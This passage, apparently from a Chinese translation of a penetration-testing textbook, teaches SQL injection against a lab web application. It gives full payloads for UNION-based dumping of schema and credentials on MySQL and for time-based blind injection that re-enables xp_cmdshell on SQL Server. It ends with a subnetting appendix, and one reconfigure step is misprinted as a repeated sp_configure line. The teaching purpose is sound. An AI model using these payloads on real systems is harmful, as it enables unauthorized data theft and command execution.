  \ `login.php` 页面。如果用户已通过身份验证，则会显示一个用于搜索单词的表单。如果通过 POST 提交了单词字段，应用程序会连接到后端数据库服务器，并切换到使用\
  \ `testapp` 数据库。执行数据库查询，查找所有包含提交数据的单词。`%` 符号是通配符，因此它会使查询搜索提交数据在单词中的任何位置。\n\n查询执行后，脚本会遍历每个返回的行，并将输出打印到屏幕上。我们可以看到这个脚本也没有输入清理，因此我们可以像利用登录屏幕一样利用它。不过，由于这个脚本会将输出打印到屏幕上，我们能够看到向服务器发出的查询结果。我们可以利用这个脚本绘制出用于存储登录信息的表，并将数据转储到屏幕上。让我们看看如何实现这一点。\n\
  \n注意\n\n我们在本章中展示了所利用的每个页面的代码。在实际渗透测试中，我们通常无法访问脚本代码。我们在此包含这些代码，是为了不仅理解如何破解，还了解导致代码出现问题的原因。\n\
  \n从 MySQL 5 版本开始，引入了 `information_schema` 数据库。这个数据库是一个元数据库，包含 MySQL 数据库中所有元素的信息。我们可以查询\
  \ `information_schema` 来了解数据库中我们有权访问的任何信息。我们已经看到了所利用应用程序的代码，但假设我们没有看到，我们就不知道登录表的名称。通过使用\
  \ `information_schema` 数据库，我们可以找到这些信息。\n\n我们正在利用的查询如下所示：\n\n```sql\nselect * from\
  \ wordlist where word like '%{$_POST['word']}%'\n```\n\n我们真正需要做的是将这个查询调整为一个能够显示\
  \ `information_schema` 数据库中信息的查询。该数据库中有一个表，包含所有我们可以访问的表的信息。这个表叫做 `TABLES`，包含我们可以访问的数据库和表的所有元数据，包括表所在的数据库以及表本身的名称。我们将构建一个查询，强制\
  \ `SELECT` 语句返回这些信息。一个问题是，我们的输出只打印返回数据的第一个元素。我们需要两个信息，但只有一个字段来放置它们，因此我们需要做一些额外的处理，将字段中的数据合并到一个字段中以便正确输出。\n\
  \n我们并不关心 `wordlist` 表中的数据，因此我们希望修改查询，使其不返回任何这些信息，只返回我们想要的信息。我们正常搜索单词 `qqqq`，它没有返回任何结果，因此搜索这个单词是确保不返回任何\
  \ `wordlist` 数据的好方法。我们将使用 `UNION` 语句将两个查询连接在一起，并同时返回它们的输出。在执行 SQL 注入时，`UNION` 关键字非常重要，因为它允许我们从通常无法在查询中访问的表中返回额外信息。让我们使用\
  \ `UNION` 语句开始从 `information_schema` 数据库中获取信息。\n\n我们发出查询：\n\n```sql\nqqqq' union\
  \ select TABLE_NAME from information_schema.TABLES --\n```\n\n我们看到所有我们可以访问的表的输出。问题是其中许多表是\
  \ `information_schema` 数据库本身的表。我们并不关心这些，因此让我们扩展查询，使其只返回不在 `information_schema` 数据库中的表名。\n\
  \n```sql\nqqqq' union select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA\
  \ != 'information_schema' --\n```\n\n现在，我们只看到我们感兴趣的表。\n\n然而，除了表名之外，知道数据库名称通常也很有用，因此我们修改查询，以便在一个字段中同时看到两者。要将多个信息合并到一个字段中，我们可以使用\
  \ MySQL 的 `CONCAT` 指令，将所有信息连接成一个字符串。我们再次修改查询。\n\n```sql\nqqqq' union select CONCAT(TABLE_SCHEMA,'|',TABLE_NAME)\
  \ from information_schema.TABLES where TABLE_SCHEMA != 'information_schema' --\n\
  ```\n\n现在，我们的查询将数据库名称（或模式名称）与表名连接起来，使用管道符作为分隔符。这应该会输出如图 10.9 所示的结果，显示我们创建的两个表。\n\
  \n![image](img/F000102f10-09-9781597497299.jpg)\n\n图 10.9 转储 `testapp` 数据库中表的信息\n\
  \n我们看到输出包含两个表：`testapp` 数据库的 `login` 表和 `wordlist` 表。我们现在知道要转储哪个表，但不知道字段是什么。`information_schema`\
  \ 数据库也会帮助我们解决这个问题。该数据库中还有另一个表，包含每个数据库所有列的信息，即 `COLUMNS` 表。我们可以查询 `COLUMNS` 表的 `COLUMN_NAME`\
  \ 和 `DATA_TYPE` 字段，以查看每个字段的名称及其包含的数据类型。让我们修改上一个查询，以便获取这些信息。\n\n```sql\nqqqq' union\
  \ select CONCAT(COLUMN_NAME,'|',DATA_TYPE) from information_schema.COLUMNS where\
  \ TABLE_NAME = 'login'--\n```\n\n我们应该能够返回表中每个变量的名称及其关联的数据类型。我们将其限制为仅 `login` 表，这样就不必担心多余的数据。执行查询后，我们会返回每个变量及其包含的数据类型。图\
  \ 10.10 显示存在两个字段：`login` 和 `pass` 字段。它们都包含 `varchar` 数据，这是一种字符串类型。现在，我们拥有了从 `login`\
  \ 表中获取登录名和密码所需的所有信息。\n\n![image](img/F000102f10-10-9781597497299.jpg)\n\n图 10.10\
  \ 转储 `login` 表的列信息\n\n\n\n\n图 10.10 从 information_schema 中选择数据字段\n\n我们再次构建一个新查询；这次我们确切知道要查找什么。我们想要\
  \ `login` 表中的 `login` 和 `pass` 字段。我们创建查询字符串。\n\n`qqqq’ union select CONCAT(login,’|’,pass)\
  \ from login --`\n\n我们从表中同时选择 `login` 和 `pass` 字段，并用管道符将它们连接起来，将两个字段作为一个字符串返回。图\
  \ 10.11 显示了我们之前创建的默认登录信息被转储到屏幕上。我们可以看到登录名是 `admin`，密码是 `admin123`。当我们返回搜索页面并尝试刚刚转储的凭据时，发现它们有效。我们现在已成功利用\
  \ SQLi 漏洞不仅获得了应用程序的访问权限，还检索了正常情况下无法访问的数据。\n\n![image](img/F000102f10-11-9781597497299.jpg)\n\
  \n图 10.11 成功从 search.php 转储登录凭据\n\n### Microsoft SQL Server 上的 SQL 注入\n\n在 MySQL\
  \ 和 Microsoft SQL Server 上执行 SQLi 的步骤非常相似。我们利用了代码中类似的问题；由于 SQL 是一种标准，语言本身非常接近。Microsoft\
  \ SQL Server 包含一个我们如果不在本章中提及就会失职的功能：一个名为 `xp_cmdshell` 的便捷存储过程，它允许 SQL 服务器执行 shell\
  \ 命令。这个存储过程通常被关闭，但如果我们发现一个应用程序，其服务器管理员以数据库管理员身份运行应用程序，我们可以自己重新启用它。存储过程是在 SQL 服务器内部运行的代码片段，它们被构建成函数，这样我们只需传递参数即可执行它们，而无需在需要重复执行某些操作时重复编写代码。\n\
  \n在本节中，我们将研究一个登录页面漏洞与我们在 MySQL 下处理的完全相同的 Web 应用程序，但我们将研究如何利用 SQLi 漏洞并在服务器上获得 shell。我们将首先验证该功能是否未启用，然后努力启用该功能，最后使用\
  \ `xp_cmdshell` 函数在服务器上执行命令。\n\n#### 验证漏洞\n\n首先，我们需要验证页面的漏洞。当我们第一次到达页面时，会看到图 10.12\
  \ 中显示的登录屏幕。当我们在页面中输入随机内容时，登录失败，但当我们尝试在登录字段中输入字符串 `’ or 1=1 --` 时，我们获得了应用程序的访问权限。我们需要确保在\
  \ Microsoft SQL Server 中两个破折号后面也包含空格，以确保注释被正确解释。虽然获得应用程序的访问权限可能很有趣，但我们或许可以利用这个漏洞做更多事情。\n\
  \n![image](img/F000102f10-12-9781597497299.jpg)\n\n图 10.12 可能存在漏洞的登录页面\n\n针对此应用程序的下一步是检查\
  \ `xp_cmdshell` 是否已启用。但是，如果我们看不到输出，如何知道它正在运行？一种常见的确定 SQLi 是否在起作用（当我们无法看到它时）的方法是使用时间方法。这被称为盲\
  \ SQLi，因为我们无法看到发生了什么；我们必须通过其他方式确定成功与否。要检查 `xp_cmdshell` 是否正在运行，我们可以使用 `ping` 命令。但为什么是\
  \ `ping`？默认情况下，`ping` 每秒发送一个数据包。因此，如果我们发送五个 ping 数据包，应该会看到脚本执行挂起五秒钟。让我们用 `xp_cmdshell`\
  \ 语法构造一个新的 SQLi 字符串。\n\n`’ or 1=1 ; exec xp_cmdshell ’ping –n 5 127.0.0.1’ --`\n\
  \n然而，当我们运行查询时，脚本根本没有挂起。我们试图让 `xp_cmdshell` 存储过程对 `127.0.0.1` 执行五次 ping 操作，从而使脚本等待五秒钟。不幸的是，`xp_cmdshell`\
  \ 未启用。希望我们是以管理员用户身份登录的。如果不是，我们将不得不寻找其他方法来利用这台机器。为了检查我们是否是管理员，我们再次修改注入字符串。\n\n`’\
  \ or 1=1 ; if is_srvrolemember(’sysadmin’) > 0 waitfor delay ’0:0:5’ --`\n\n这个新字符串利用了\
  \ SQL 服务器内的条件能力。我们使用 `is_srvrolemember` 存储过程查询数据库，以确定我们是否是 `sysadmin`。如果是，存储过程返回值\
  \ 1；否则返回 0。因此，我们的条件检查我们是否是管理员；如果是，则使用 `waitfor` 语法将脚本暂停五秒钟。延迟的格式是小时:分钟:秒。当我们尝试运行此查询时，脚本挂起了五秒钟。我们使用的数据库用户是管理员用户！我们现在可以着手重新启用\
  \ `xp_cmdshell`。\n\n注意\n\n有时网络延迟会导致 Web 应用程序加载缓慢。当我们遇到缓慢的应用程序时，有时需要增加延迟时间，以便明显看出注入正在生效。在这些情况下，将延迟增加到\
  \ 10 或 20 秒，然后重试。但要小心，因为当脚本运行时，数据库连接会挂起。如果连接保持时间过长，可能会导致数据库服务器出现问题。\n\n#### 重新启用\
  \ xp_cmdshell\n\n既然我们知道自己是管理员，就必须努力重新启用 `xp_cmdshell` 存储过程。后端数据库版本是 SQL Server 2005。因此，要重新启用\
  \ `xp_cmdshell`，我们必须执行两个额外的命令。首先，我们必须通过 `sp_configure` 存储过程启用高级选项，然后才能通过 `sp_configure`\
  \ 命令重新启用 `xp_cmdshell`。让我们看看执行此操作所需的 SQLi。\n\n首先，我们需要启用高级选项。\n\n`’ or 1=1 ; exec\
  \ sp_configure ’show advanced options’ , 1 --`\n\n一旦启用了选项，在重新打开 `xp_cmdshell` 之前，我们需要发出一个\
  \ `reconfigure` 命令。为此，我们将 SQLi 更改为 `’ or 1=1 ; reconfigure --`。（请记住，需要在 `--` 后插入一个空格，代码才能正常运行。）\n\
  \n现在是重新启用 `xp_cmdshell` 的时候了。\n\n`’ or 1=1 ; exec sp_configure ’xp_cmdshell’ , 1\
  \ --`\n\n我们将此作为登录信息发送，现在命令 shell 应该已启用。我们需要再发出一个 `reconfigure` 命令。\n\n`’ or 1=1\
  \ ; exec sp_configure ’xp_cmdshell’ , 1 --`\n\n我们可以返回并再次尝试运行 `ping` 命令，这次应该会看到延迟。\n\
  \n让我们再次提供登录信息：\n\n`’ or 1=1 ; exec xp_cmdshell ’ping -n 5 127.0.0.1’ --`\n\n这次，我们看到了五秒钟的延迟。我们已成功在数据库服务器上执行了\
  \ `ping` 命令。现在我们可以通过数据库服务器运行命令。我们已经从一个简单的盲 SQLi 漏洞一路走到了对机器的 shell 访问权限。从这里开始，我们可以做很多事情，包括上传\
  \ Meterpreter shell，以便进行更高级的后渗透操作。\n\n## 总结\n\n我们讨论了后渗透任务，例如收集信息、添加用户以及使用更强大的 shell。虽然本章并非详尽无遗，但我们现在应该能够完成许多作为渗透测试人员所需的基本后渗透任务。当我们遇到\
  \ Windows 机器时，我们将知道如何分析该机器以确定用户和网络的情况，并且一旦我们掌握了一系列非常喜欢的命令，我们就知道如何将它们转换为 Meterpreter\
  \ 脚本，以便轻松运行。我们甚至研究了 Linux 下的网络信息收集。\n\n\n\n\n通过 SQL 注入（SQLi），我们研究了绕过登录页面、转储数据库，甚至在\
  \ Windows 机器上执行 shell 命令的方法。凭借这些技能，我们具备了进行基本 SQLi 和盲 SQLi 的基础。有了这个基础、一份 SQL 参考手册以及一点好奇心，这类技能将帮助我们培养强大的\
  \ Web 应用程序测试能力，这些能力在渗透测试中会大有裨益。\n\n# 附录\n\n# 子网划分与 CIDR 地址\n\n## 本章内容：\n\n• 网络掩码基础\n\
  \n## 网络掩码基础\n\n网络掩码是一种应用于 IP 地址的二进制掩码，用于判断两个 IP 地址是否属于同一子网。其工作原理是将 IP 地址与网络掩码进行二进制与运算，从而得到网络地址。如果两台主机位于同一网络中，则认为它们处于同一子网。为了理解其工作原理，我们以\
  \ IP 地址 192.168.1.5 和 CIDR 掩码 /24 为例。CIDR 值表示网络掩码中已设置的位数，因此在许多情况下，使用 CIDR 表示法比直接使用网络掩码更简便。本例中，设置了\
  \ 24 位。网络掩码与 IP 地址一样，被分为四组，每组 8 位。我们通常用十进制（基数为 10）值来表示它们。当设置了 24 位时，我们有三个组，每组的所有\
  \ 8 位都被设置。\n\n当所有 8 位都被设置时，我们得到二进制数 11111111，即十进制 255。因此，CIDR 掩码 /24 对应 255.255.255.0，而\
  \ /25 对应 255.255.255.128。注意，我们填充了前三个八位组，而网络掩码并非 0.255.255.255。这是因为在计算掩码时，我们总是从最高位开始。因此，/1\
  \ 对应 10000000.00000000.00000000.00000000 即 128.0.0.0，/2 对应 11000000.00000000.00000000.00000000\
  \ 即 192.0.0.0。\n\n现在，我们取网络掩码和 IP 地址，用它们的二进制值来确定该 IP 地址的网络地址。我们将对这两个地址进行二进制与运算来计算网络地址。\n\
  \n将 IP 地址转换为二进制后，得到 11000000.10101000.00000001.00000101。我们从最左边的高位开始，逐位与网络掩码值 11111111.11111111.11111111.00000000\
  \ 进行二进制与运算，并得出结果。\n\n![image](img/appen.jpg)\n\n当我们对每一位进行与运算时，两个数字必须在相同位置都有 1，最终结果中才会有\
  \ 1。将每个值中为 1 的位置对应的 1 传递到最终结果中，我们得到网络地址 192.168.1.0。\n\n主机位是 CIDR 值从所有可能值（32）中减去后剩余的部分。广播地址的计算方法是：取主机位的最大值，然后将其加到网络地址上。这告诉我们该范围内的最后一个有效\
  \ IP 地址。\n\n在本例中，网络掩码有 24 位，因此 32 − 24 = 8 位。11111111 的值为 255，所以广播地址为 192.168.1.255。\n\
  \n一个网络中的可能主机数量是网络地址与主机地址之间的主机数。确定网络中主机数量的一种简单方法是将所有主机位（除最后一位外）设置为 1。在本例中，我们有 8 个主机位，因此将值设置为\
  \ 11111110，即 254。这表明我们的子网中可以有 254 台主机。\n\n我们学到了什么？如果有一个 CIDR 地址 192.168.1.5/24，我们现在知道如何确定网络掩码\
  \ 255.255.255.0、网络地址 192.168.1.0、广播地址 192.168.1.255 以及主机数量 254。掌握了这些信息，当给定一个范围 10.11.12.13/30\
  \ 时，我们就知道如何轻松计算出该范围，从而明确应该测试网络的哪个区域。\n\n# 索引\n\n注：页码后带 f 表示插图，t 表示表格，b 表示文本框。\n\n\
